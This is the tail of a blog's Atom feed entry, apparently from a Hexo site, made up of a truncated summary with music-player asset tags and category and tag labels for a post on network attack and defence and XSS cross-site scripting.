        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="网络攻防" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="XSS跨站脚本攻击" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
    
    
      <category term="网络攻防" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
    
  </entry>
  
</feed>
